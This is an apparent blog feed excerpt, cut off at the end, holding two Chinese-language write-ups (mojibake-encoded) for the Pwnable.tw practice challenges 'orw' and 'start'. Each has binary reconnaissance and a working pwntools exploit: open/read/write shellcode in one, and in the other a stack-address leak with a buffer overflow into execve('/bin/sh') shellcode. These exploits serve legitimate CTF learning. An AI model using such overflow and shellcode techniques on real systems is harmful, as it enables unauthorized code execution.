    <content type="html"><![CDATA[<h1 id="Pwnable-tw-orw"><a href="#Pwnable-tw-orw" class="headerlink" title="Pwnable.tw - orw"></a>Pwnable.tw - orw</h1><h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><blockquote><p>Read the flag from &#x2F;home&#x2F;orw&#x2F;flag.<br>Only open read write syscall are allowed to use.</p></blockquote><h3 id="Source"><a href="#Source" class="headerlink" title="Source"></a>Source</h3><p><a class="link"   href="https://pwnable.tw/challenge/#2" >https://pwnable.tw/challenge/#2 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h2 id="0x1-Initial-Reconnaissance"><a href="#0x1-Initial-Reconnaissance" class="headerlink" title="0x1 Initial Reconnaissance"></a>0x1 Initial Reconnaissance</h2><p>ä¸€æ¨£å…ˆè§€å¯Ÿé€™é¡Œçš„ä¸€äº›åŸºæœ¬è³‡è¨Šã€‚</p><h3 id="file"><a href="#file" class="headerlink" title="file"></a>file</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">â””â”€$ file orw</span><br><span class="line">orw: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, <span class="keyword">for</span> GNU/Linux 2.6.32, BuildID[sha1]=e60ecccd9d01c8217387e8b77e9261a1f36b5030, not stripped</span><br></pre></td></tr></table></figure></div><h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">â””â”€$ checksec orw</span><br><span class="line">[*] <span class="string">&#x27;/home/kazmatw/pwnable/orw/orw&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    Stack:    Executable</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure></div><h3 id="orw"><a href="#orw" class="headerlink" title=".&#x2F;orw"></a>.&#x2F;orw</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">â””â”€$ ./orw</span><br><span class="line">Give my your shellcode:1234</span><br><span class="line">Segmentation fault</span><br></pre></td></tr></table></figure></div><h3 id="seccomp"><a href="#seccomp" class="headerlink" title="seccomp"></a>seccomp</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">â””â”€$ seccomp-tools dump ./orw</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = <span class="built_in">arch</span></span><br><span class="line"> 0001: 0x15 0x00 0x09 0x40000003  <span class="keyword">if</span> (A != ARCH_I386) goto 0011</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x15 0x07 0x00 0x000000ad  <span class="keyword">if</span> (A == rt_sigreturn) goto 0011</span><br><span class="line"> 0004: 0x15 0x06 0x00 0x00000077  <span class="keyword">if</span> (A == sigreturn) goto 0011</span><br><span class="line"> 0005: 0x15 0x05 0x00 0x000000fc  <span class="keyword">if</span> (A == exit_group) goto 0011</span><br><span class="line"> 0006: 0x15 0x04 0x00 0x00000001  <span class="keyword">if</span> (A == <span class="built_in">exit</span>) goto 0011</span><br><span class="line"> 0007: 0x15 0x03 0x00 0x00000005  <span class="keyword">if</span> (A == open) goto 0011</span><br><span class="line"> 0008: 0x15 0x02 0x00 0x00000003  <span class="keyword">if</span> (A == <span class="built_in">read</span>) goto 0011</span><br><span class="line"> 0009: 0x15 0x01 0x00 0x00000004  <span class="keyword">if</span> (A == write) goto 0011</span><br><span class="line"> 0010: 0x06 0x00 0x00 0x00050026  <span class="built_in">return</span> ERRNO(38)</span><br><span class="line"> 0011: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br></pre></td></tr></table></figure></div><h3 id="disassemble-main"><a href="#disassemble-main" class="headerlink" title="disassemble main"></a>disassemble main</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">gefâ¤  disassemble main</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> main:</span><br><span class="line">   0x08048548 &lt;+0&gt;:     lea    ecx,[esp+0x4]</span><br><span class="line">   0x0804854c &lt;+4&gt;:     and    esp,0xfffffff0</span><br><span class="line">   0x0804854f &lt;+7&gt;:     push   DWORD PTR [ecx-0x4]</span><br><span class="line">   0x08048552 &lt;+10&gt;:    push   ebp</span><br><span class="line">   0x08048553 &lt;+11&gt;:    mov    ebp,esp</span><br><span class="line">   0x08048555 &lt;+13&gt;:    push   ecx</span><br><span class="line">   0x08048556 &lt;+14&gt;:    sub    esp,0x4</span><br><span class="line">   0x08048559 &lt;+17&gt;:    call   0x80484cb &lt;orw_seccomp&gt;</span><br><span class="line">   0x0804855e &lt;+22&gt;:    sub    esp,0xc</span><br><span class="line">   0x08048561 &lt;+25&gt;:    push   0x80486a0</span><br><span class="line">   0x08048566 &lt;+30&gt;:    call   0x8048380 &lt;<span class="built_in">printf</span>@plt&gt;</span><br><span class="line">   0x0804856b &lt;+35&gt;:    add    esp,0x10</span><br><span class="line">   0x0804856e &lt;+38&gt;:    sub    esp,0x4</span><br><span class="line">   0x08048571 &lt;+41&gt;:    push   0xc8</span><br><span class="line">   0x08048576 &lt;+46&gt;:    push   0x804a060</span><br><span class="line">   0x0804857b &lt;+51&gt;:    push   0x0</span><br><span class="line">   0x0804857d &lt;+53&gt;:    call   0x8048370 &lt;<span class="built_in">read</span>@plt&gt;</span><br><span class="line">   0x08048582 &lt;+58&gt;:    add    esp,0x10</span><br><span class="line">   0x08048585 &lt;+61&gt;:    mov    eax,0x804a060</span><br><span class="line">   0x0804858a &lt;+66&gt;:    call   eax</span><br><span class="line">   0x0804858c &lt;+68&gt;:    mov    eax,0x0</span><br><span class="line">   0x08048591 &lt;+73&gt;:    mov    ecx,DWORD PTR [ebp-0x4]</span><br><span class="line">   0x08048594 &lt;+76&gt;:    leave</span><br><span class="line">   0x08048595 &lt;+77&gt;:    lea    esp,[ecx-0x4]</span><br><span class="line">   0x08048598 &lt;+80&gt;:    ret</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure></div><h3 id="0x2-Exploitation"><a href="#0x2-Exploitation" class="headerlink" title="0x2 Exploitation"></a>0x2 Exploitation</h3><p>é¡Œç›®æè¿°èªªåªèƒ½ä½¿ç”¨ open read writeï¼Œå¾ seccomp-tools ä¹Ÿèƒ½ç¢ºèªé€™å€‹é™åˆ¶ï¼Œé€†å‘åˆ†ææœƒç™¼ç¾å°±æ˜¯å¾ˆå–®ç´”çš„æŠŠæˆ‘å€‘çµ¦çš„ shellcode æ‹¿å»åŸ·è¡Œè€Œå·²ï¼Œå¥½åƒä¹Ÿæ²’ä»€éº¼å¥½è§£é‡‹çš„ï¼Œé‚£å°±ç›´æ¥ä¸Š exploit XDã€‚</p><h3 id="0x3-Exploit"><a href="#0x3-Exploit" class="headerlink" title="0x3 Exploit"></a>0x3 Exploit</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#r = process(&#x27;./orw&#x27;)</span></span><br><span class="line">r = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>, <span class="number">10001</span>)</span><br><span class="line"></span><br><span class="line">sc = asm(</span><br><span class="line">    shellcraft.i386.linux.<span class="built_in">open</span>(<span class="string">b&#x27;/home/orw/flag&#x27;</span>) +</span><br><span class="line">    shellcraft.i386.linux.read(<span class="string">&#x27;eax&#x27;</span>, <span class="string">&#x27;esp&#x27;</span>, <span class="number">50</span>) +</span><br><span class="line">    shellcraft.i386.linux.write(<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;esp&#x27;</span>, <span class="number">50</span>)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">r.sendafter(<span class="string">b&#x27;:&#x27;</span>, sc)</span><br><span class="line">flag = r.recvuntil(<span class="string">b&#x27;&#125;&#x27;</span>)</span><br><span class="line">r.recv()</span><br><span class="line">success(<span class="string">&#x27;Flag: %s&#x27;</span> % flag)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div><p>Resultï¼š</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">â””â”€$ python exploit.py</span><br><span class="line">[+] Opening connection to chall.pwnable.tw on port 10001: Done</span><br><span class="line">[+] Flag: b<span class="string">&#x27;FLAG&#123;?????????????????????????&#125;&#x27;</span></span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br></pre></td></tr></table></figure></div><h2 id="0x5-References"><a href="#0x5-References" class="headerlink" title="0x5 References"></a>0x5 References</h2><p>å¯ä»¥åƒè€ƒå¼µå…ƒåœ¨ edu-ctf ä¸Šçš„ how2orwï¼Œä¸‹é¢é™„ä¸Šå½±ç‰‡é€£çµå’Œ writeupï¼š<br><a class="link"   href="https://www.youtube.com/watch?v=U8N6aE-Nq-Q" >https://www.youtube.com/watch?v=U8N6aE-Nq-Q <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a href="https://kazma.tw/2023/12/10/Yuawn-Pwn1-orw-Writeup/">https://kazma.tw/2023/12/10/Yuawn-Pwn1-orw-Writeup/</a></p><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Pwnable-tw-orw&quot;&gt;&lt;a href=&quot;#Pwnable-tw-orw&quot; class=&quot;headerlink&quot; title=&quot;Pwnable.tw - orw&quot;&gt;&lt;/a&gt;Pwnable.tw - orw&lt;/h1&gt;&lt;h3 id=&quot;Description&quot;&gt;</summary>
      
    
    
    
    
    <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
    
    <category term="pwnabletw" scheme="https://kazma.tw/tags/pwnabletw/"/>
    
    <category term="orw" scheme="https://kazma.tw/tags/orw/"/>
    
  </entry>
  
  <entry>
    <title>Pwnable.tw start Writeup</title>
    <link href="https://kazma.tw/2024/02/07/Pwnable-tw-start-Writeup/"/>
    <id>https://kazma.tw/2024/02/07/Pwnable-tw-start-Writeup/</id>
    <published>2024-02-06T17:46:25.000Z</published>
    <updated>2024-02-16T07:57:12.642Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Pwnable-tw-start"><a href="#Pwnable-tw-start" class="headerlink" title="Pwnable.tw - start"></a>Pwnable.tw - start</h1><h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><blockquote><p>Just a start.</p></blockquote><h3 id="Source"><a href="#Source" class="headerlink" title="Source"></a>Source</h3><p><a class="link"   href="https://pwnable.tw/challenge/#1" >https://pwnable.tw/challenge/#1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h2 id="0x1-Initial-Reconnaissance"><a href="#0x1-Initial-Reconnaissance" class="headerlink" title="0x1 Initial Reconnaissance"></a>0x1 Initial Reconnaissance</h2><p>é¦–å…ˆè§€å¯Ÿé€™é¡Œçš„ä¸€äº›åŸºæœ¬è³‡è¨Šå¯ä»¥ç™¼ç¾é€™é¡Œæ˜¯ x86 çš„ binaryï¼Œç„¶å¾Œä¿è­·æ©Ÿåˆ¶éƒ½æ²’é–‹ã€‚æ²’æœ‰ main ï¼Œä»£è¡¨å¾ˆæœ‰å¯èƒ½æ˜¯ç›´æ¥ç”¨çµ„èªæ‰‹åˆ»çš„ã€‚gdb åçµ„è­¯ _start ä¹‹å¾Œä¹Ÿæœƒç™¼ç¾æŒ‡ä»¤ç¢ºå¯¦å¾ˆå°‘ã€‚</p><h3 id="file"><a href="#file" class="headerlink" title="file"></a>file</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">â””â”€$ file start</span><br><span class="line">start: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, not stripped</span><br></pre></td></tr></table></figure></div><h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">â””â”€$ checksec start</span><br><span class="line">[*] <span class="string">&#x27;/home/kazmatw/pwnable/start/start&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure></div><h3 id="start"><a href="#start" class="headerlink" title=".&#x2F;start"></a>.&#x2F;start</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">â””â”€$ ./start</span><br><span class="line">Let<span class="string">&#x27;s start the CTF:123</span></span><br></pre></td></tr></table></figure></div><h3 id="disassemble"><a href="#disassemble" class="headerlink" title="disassemble"></a>disassemble</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">gefâ¤  info <span class="keyword">function</span></span><br><span class="line">All defined <span class="built_in">functions</span>:</span><br><span class="line"></span><br><span class="line">Non-debugging symbols:</span><br><span class="line">0x08048060  _start</span><br><span class="line">0x0804809d  _exit</span><br><span class="line">0x080490a3  __bss_start</span><br><span class="line">0x080490a3  _edata</span><br><span class="line">0x080490a4  _end</span><br><span class="line">0xf7ffc580  __kernel_vsyscall</span><br><span class="line">0xf7ffc5a0  __kernel_sigreturn</span><br><span class="line">0xf7ffc5b0  __kernel_rt_sigreturn</span><br><span class="line">0xf7ffc7a0  __vdso_gettimeofday</span><br><span class="line">0xf7ffcb50  __vdso_time</span><br><span class="line">0xf7ffcba0  __vdso_clock_gettime</span><br><span class="line">0xf7ffd060  __vdso_clock_gettime64</span><br><span class="line">0xf7ffd560  __vdso_clock_getres</span><br><span class="line">0xf7ffd5f0  __vdso_getcpu</span><br><span class="line">gefâ¤  disassemble _start</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> _start:</span><br><span class="line">=&gt; 0x08048060 &lt;+0&gt;:     push   esp</span><br><span class="line">   0x08048061 &lt;+1&gt;:     push   0x804809d</span><br><span class="line">   0x08048066 &lt;+6&gt;:     xor    eax,eax</span><br><span class="line">   0x08048068 &lt;+8&gt;:     xor    ebx,ebx</span><br><span class="line">   0x0804806a &lt;+10&gt;:    xor    ecx,ecx</span><br><span class="line">   0x0804806c &lt;+12&gt;:    xor    edx,edx</span><br><span class="line">   0x0804806e &lt;+14&gt;:    push   0x3a465443</span><br><span class="line">   0x08048073 &lt;+19&gt;:    push   0x20656874</span><br><span class="line">   0x08048078 &lt;+24&gt;:    push   0x20747261</span><br><span class="line">   0x0804807d &lt;+29&gt;:    push   0x74732073</span><br><span class="line">   0x08048082 &lt;+34&gt;:    push   0x2774654c</span><br><span class="line">   0x08048087 &lt;+39&gt;:    mov    ecx,esp</span><br><span class="line">   0x08048089 &lt;+41&gt;:    mov    dl,0x14</span><br><span class="line">   0x0804808b &lt;+43&gt;:    mov    bl,0x1</span><br><span class="line">   0x0804808d &lt;+45&gt;:    mov    al,0x4</span><br><span class="line">   0x0804808f &lt;+47&gt;:    int    0x80</span><br><span class="line">   0x08048091 &lt;+49&gt;:    xor    ebx,ebx</span><br><span class="line">   0x08048093 &lt;+51&gt;:    mov    dl,0x3c</span><br><span class="line">   0x08048095 &lt;+53&gt;:    mov    al,0x3</span><br><span class="line">   0x08048097 &lt;+55&gt;:    int    0x80</span><br><span class="line">   0x08048099 &lt;+57&gt;:    add    esp,0x14</span><br><span class="line">   0x0804809c &lt;+60&gt;:    ret</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure></div><h2 id="0x2-Inspecting-Assembly-Instructions"><a href="#0x2-Inspecting-Assembly-Instructions" class="headerlink" title="0x2 Inspecting Assembly Instructions"></a>0x2 Inspecting Assembly Instructions</h2><p>å°æ‡‰ä¸Šé¢çš„åœ–ç‚ºäº†æ–¹ä¾¿èªªæ˜ï¼Œæˆ‘ç”¨åç§»é‡ä¾†ä»£è¡¨å„æ¢æŒ‡ä»¤ï¼š</p><table><thead><tr><th align="center">åç§»é‡</th><th align="center">èªªæ˜</th></tr></thead><tbody><tr><td align="center">+0</td><td align="center">saved esp</td></tr><tr><td align="center">+1</td><td align="center">push exit_addr</td></tr><tr><td align="center">+6 ~ +12</td><td align="center">initialize 4 registers</td></tr><tr><td align="center">+14 ~ +34</td><td align="center">push â€œLetâ€™s start the CTF:â€</td></tr><tr><td align="center">+39 ~ +47</td><td align="center">write(fd &#x3D; 1, *buf &#x3D; esp, count &#x3D; 0x14)</td></tr><tr><td align="center">+49 ~ +55</td><td align="center">read(fd &#x3D; 1, *buf &#x3D; esp, count &#x3D; 0x3c)</td></tr><tr><td align="center">+57</td><td align="center">esp + 0x14</td></tr><tr><td align="center">+60</td><td align="center">ret</td></tr></tbody></table><p>æˆ‘å€‘ä¾†ç”¨è¡¨æ ¼æ•´ç†ä¸€ä¸‹ç›®å‰ stack çš„ç‹€æ…‹ï¼Œå‡è¨­ä¸€é–‹å§‹ç¨‹å¼åŸ·è¡Œå‰ esp çš„åœ°å€åœ¨ xï¼Œç„¶å¾Œç”±ä¸Šå¾€ä¸‹æ˜¯ä½ä½åˆ°é«˜ä½</p><table><thead><tr><th align="center">åœ°å€</th><th align="center">æ•¸å€¼</th><th align="center">å‚™è¨»</th></tr></thead><tbody><tr><td align="center">x-28</td><td align="center">0x2774654c</td><td align="center">â€œLetâ€™â€</td></tr><tr><td align="center">x-24</td><td align="center">0x74732073</td><td align="center">â€œs stâ€</td></tr><tr><td align="center">x-20</td><td align="center">0x20747261</td><td align="center">â€œart â€œ</td></tr><tr><td align="center">x-16</td><td align="center">0x20656874</td><td align="center">â€œthe â€œ</td></tr><tr><td align="center">x-12</td><td align="center">0x3a465443</td><td align="center">â€œCTF:â€</td></tr><tr><td align="center">x-8</td><td align="center">0x804809d</td><td align="center">exit_addr</td></tr><tr><td align="center">x-4</td><td align="center">x</td><td align="center">saved esp</td></tr><tr><td align="center">x</td><td align="center">?</td><td align="center">old esp</td></tr></tbody></table><h2 id="0x3-Exploitation"><a href="#0x3-Exploitation" class="headerlink" title="0x3 Exploitation"></a>0x3 Exploitation</h2><p>åœ¨ä¸Šä¸€å€‹éƒ¨åˆ†æˆ‘å€‘å¯ä»¥ç™¼ç¾ read çš„æ™‚å€™æœƒæœ‰ bof çš„å•é¡Œï¼Œæ‰€ä»¥æˆ‘å€‘å¯ä»¥æ§ eipã€‚è€Œä¸”ä¿è­·æ©Ÿåˆ¶å…¨é—œæ‰€ä»¥å¯ä»¥ç›´æ¥ ret2scï¼Œä½†å•é¡Œæ˜¯æˆ‘å€‘ä¸çŸ¥é“ stack çš„åœ°å€ï¼Œå› æ­¤éœ€è¦å…ˆ leak æœ‰ç”¨çš„è³‡è¨Šï¼Œåšæ³•æ˜¯å¯ä»¥åœ¨ ret å¡«ä¸Š write çš„ä½å€ï¼Œå› ç‚ºåœ¨ ret å‰ esp è¢«æ¨åˆ° ret ä¸Šé¢ï¼Œæ‰€ä»¥ç¬¬äºŒæ¬¡ call write å‰ esp åœ¨ x-8 ä¸Šé¢ï¼Œcall å®Œ write å¾Œ esp åˆ° x-4 çš„ä½ç½®ï¼Œç”± x-4 å¾€å¾Œè¼¸å‡º 20 bytesï¼Œæˆ‘å€‘å°±å¯ä»¥æ‹¿åˆ°ä¸€é–‹å§‹çš„ saved espã€‚<br>æŠŠæ”»æ“Šå¾Œçš„æ¨£å­ä¹Ÿæ•´ç†è¡¨æ ¼æ‡‰è©²æœƒæ¯”è¼ƒå¥½ç†è§£ï¼Œè¦åˆ†æ¸…æ¥šé€™é¡Œå€å’Œå€¼çš„é—œä¿‚ï¼Œç„¶å¾Œç•™æ„ esp çš„è®ŠåŒ–ï¼Œread å’Œ write éƒ½æ˜¯ä»¥ esp ç‚ºèµ·å§‹è®€å¯«ï¼Œç¬¬ä¸€æ¬¡çš„ offset ç”¨ ï¼¡ è¡¨ç¤ºï¼Œç¬¬äºŒæ¬¡ç‚º Bï¼š</p><table><thead><tr><th align="center">åœ°å€</th><th align="center">æ•¸å€¼</th><th align="center">å‚™è¨»</th></tr></thead><tbody><tr><td align="center">x-28</td><td align="center">0x2774654c -&gt; AAAA</td><td align="center">â€œLetâ€™â€</td></tr><tr><td align="center">x-24</td><td align="center">0x74732073 -&gt; AAAA</td><td align="center">â€œs stâ€</td></tr><tr><td align="center">x-20</td><td align="center">0x20747261 -&gt; AAAA</td><td align="center">â€œart â€œ</td></tr><tr><td align="center">x-16</td><td align="center">0x20656874 -&gt; AAAA</td><td align="center">â€œthe â€œ</td></tr><tr><td align="center">x-12</td><td align="center">0x3a465443 -&gt; AAAA</td><td align="center">â€œCTF:â€</td></tr><tr><td align="center">x-8</td><td align="center">0x804809d -&gt; 0x8048087</td><td align="center">exit_addr -&gt; write_addr</td></tr><tr><td align="center">x-4</td><td align="center">x -&gt; BBBB</td><td align="center">saved esp</td></tr><tr><td align="center">x</td><td align="center">? -&gt; BBBB</td><td align="center">old esp</td></tr><tr><td align="center">x+4</td><td align="center">? -&gt; BBBB</td><td align="center"></td></tr><tr><td align="center">x+8</td><td align="center">? -&gt; BBBB</td><td align="center"></td></tr><tr><td align="center">x+12</td><td align="center">? -&gt; BBBB</td><td align="center"></td></tr><tr><td align="center">x+16</td><td align="center">x+20</td><td align="center"></td></tr><tr><td align="center">x+20</td><td align="center">shellcode</td><td align="center"></td></tr></tbody></table><p>æˆ‘å€‘ leak å‡ºä¾†çš„ä½å€æ˜¯ xï¼Œx+20 æ˜¯ shellcode çš„èµ·å§‹ä½ç½®ï¼Œæ‰€ä»¥æˆ‘å€‘åœ¨ ret ï¼Œä¹Ÿå°±æ˜¯ x+16 çš„ä½å€å¡«ä¸Š x+20ã€‚</p><h2 id="0x4-Exploit"><a href="#0x4-Exploit" class="headerlink" title="0x4 Exploit"></a>0x4 Exploit</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line">warnings.filterwarnings(<span class="string">&quot;ignore&quot;</span>, category = BytesWarning)</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>, <span class="number">10000</span>)</span><br><span class="line"><span class="comment">#r = process(&#x27;./start&#x27;)</span></span><br><span class="line">write = <span class="number">0x08048087</span></span><br><span class="line"></span><br><span class="line">p1 = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x14</span> + p32(write)</span><br><span class="line">r.sendafter(<span class="string">b&#x27;:&#x27;</span>, p1)</span><br><span class="line">old_esp = u32(r.recv(<span class="number">4</span>))</span><br><span class="line">r.recv()</span><br><span class="line">success(<span class="string">&#x27;Old_esp = %s&#x27;</span> % <span class="built_in">hex</span>(old_esp))</span><br><span class="line"></span><br><span class="line">shellcode=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor eax,eax</span></span><br><span class="line"><span class="string">push eax</span></span><br><span class="line"><span class="string">push 0x68732f2f</span></span><br><span class="line"><span class="string">push 0x6e69622f</span></span><br><span class="line"><span class="string">mov ebx, esp</span></span><br><span class="line"><span class="string">xor ecx,ecx</span></span><br><span class="line"><span class="string">xor edx,edx</span></span><br><span class="line"><span class="string">mov al, 0xb</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">p2 = <span class="string">b&#x27;b&#x27;</span> * <span class="number">0x14</span> + p32(old_esp + <span class="number">0x14</span>) + asm(shellcode)</span><br><span class="line">r.send(p2)</span><br><span class="line">r.sendline(<span class="string">&#x27;cat /home/`whoami`/flag&#x27;</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div><p>Result:</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">â””â”€$ python exploit.py</span><br><span class="line">[+] Opening connection to chall.pwnable.tw on port 10000: Done</span><br><span class="line">[+] Old_esp = 0xffaf0770</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">FLAG&#123;??????????????????&#125;</span><br></pre></td></tr></table></figure></div><h2 id="0x5-References"><a href="#0x5-References" class="headerlink" title="0x5 References"></a>0x5 References</h2><p>å¯«é€™ç¯‡ä¹‹å‰çœ‹äº†å¥½å¤šä»½ writeupï¼Œç™¼ç¾å¥½å¤šäººéƒ½æœ‰è¬›éŒ¯qqï¼Œä¸‹é¢é™„ä¸Šä¸€äº›è¬›è§£å¾—æ¯”è¼ƒæ¸…æ¥šçš„ writeup çµ¦å¤§å®¶åƒè€ƒï¼Œç”¨è¡¨æ ¼èªªæ˜çœŸçš„æ˜¯ä¸€å€‹ä¸éŒ¯çš„æ–¹å¼ XD</p><p><a class="link"   